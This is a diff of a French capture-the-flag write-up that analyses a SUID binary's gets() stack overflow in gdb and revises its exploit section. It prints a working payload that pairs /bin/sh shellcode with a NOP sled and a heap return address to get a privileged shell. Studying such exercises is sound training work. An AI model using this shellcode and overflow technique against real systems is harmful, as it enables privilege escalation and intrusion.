@@ -20,21 +20,21 @@ Le bit `SUID` est activé, l'utilisateur `level2` peut exécuter le programme av
 
 ## Analyse
 
-Le code assembleur de la fonction `p` se présente comme ci-dessous :
+Le code assembleur de la fonction `main` appelle la fonciton `p` qui se présente comme ci-dessous :
 
 ``` bash
 (gdb) disas p
 Dump of assembler code for function p:
-   0x080484d4 <+0>:	push   ebp                              # Prologue
-   0x080484d5 <+1>:	mov    ebp,esp                          # Prologue
-   0x080484d7 <+3>:	sub    esp,0x68                         # Ajout de 104 octets sur la stack (espace global)
-   0x080484da <+6>:	mov    eax,ds:0x8049860                 
+   0x080484d4 <+0>:	push   ebp                          # Prologue
+   0x080484d5 <+1>:	mov    ebp,esp                      # Prologue
+   0x080484d7 <+3>:	sub    esp,0x68                     # réserve 104 octets sur la stack frame
+   0x080484da <+6>:	mov    eax,ds:0x8049860             # == stdout
    0x080484df <+11>:	mov    DWORD PTR [esp],eax            
    0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>
-   0x080484e7 <+19>:	lea    eax,[ebp-0x4c]                 # On met la valeur de ebp - 76 octets dans eax
-   0x080484ea <+22>:	mov    DWORD PTR [esp],eax            # esp pointe vers l'adresse dans eax (buffer)
-   0x080484ed <+25>:	call   0x80483c0 <gets@plt>           # va ecrire dans la valeur pointee par [esp] (a ebp - 76 octets)
-   0x080484f2 <+30>:	mov    eax,DWORD PTR [ebp+0x4]        
+   0x080484e7 <+19>:	lea    eax,[ebp-0x4c]              # On met la valeur de ebp - 76 octets dans eax
+   0x080484ea <+22>:	mov    DWORD PTR [esp],eax         # esp pointe vers l'adresse dans eax (buffer)
+   0x080484ed <+25>:	call   0x80483c0 <gets@plt>        # va ecrire dans la valeur pointee par [esp] (a ebp - 76 octets)
+   0x080484f2 <+30>:	mov    eax,DWORD PTR [ebp+0x4]     
    0x080484f5 <+33>:	mov    DWORD PTR [ebp-0xc],eax
    0x080484f8 <+36>:	mov    eax,DWORD PTR [ebp-0xc]
    0x080484fb <+39>:	and    eax,0xb0000000
@@ -108,21 +108,19 @@ $3 = 0xb7ee4360 <execv>
 
 ## Exploitation
 
-Il faut donc utiliser une autre technique : placer un shellcode dans le buffer et faire pointer `eip` vers une adresse valide ne commençant pas par `0xb`.
+Il faut donc utiliser une autre technique : placer un shellcode dans le buffer et faire pointer `eip` vers une adresse valide ne commençant pas par `0xb`. 
 
-Le payload contient le shellcode suivi d'un NOP sled puis de l'adresse `0x0804a008` :
+On va utiliser une adresse de heap, car la fonction `strdup()` va faire une copie sur la heap du buffer remplit précédemment avec `gets()`.
+
+Le buffer commence à ebp-0x4c, soit 76 octets avant l'ancien EBP. Il faut donc 80 octets pour atteindre l'adresse de retour sauvegardée (76 octets de buffer + 4 octets d'EBP). Les 4 octets suivants permettent de remplacer cette adresse et de contrôler EIP.
+
+Le payload contient le shellcode de 34 octets suivi de 46 NOP sled puis de l'adresse `0x0804a008` en little-endian:
 
 ```bash
 python2 -c 'print "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80" + "\x90"*46 + "\x08\xa0\x04\x08"' > payload
 ```
 
 Le shellcode permet d'exécuter `/bin/sh`.
-
-L'adresse `0x0804a008` est écrite en little-endian :
-
-```text
-\x08\xa0\x04\x08
-```
 
 ## Exploit
 
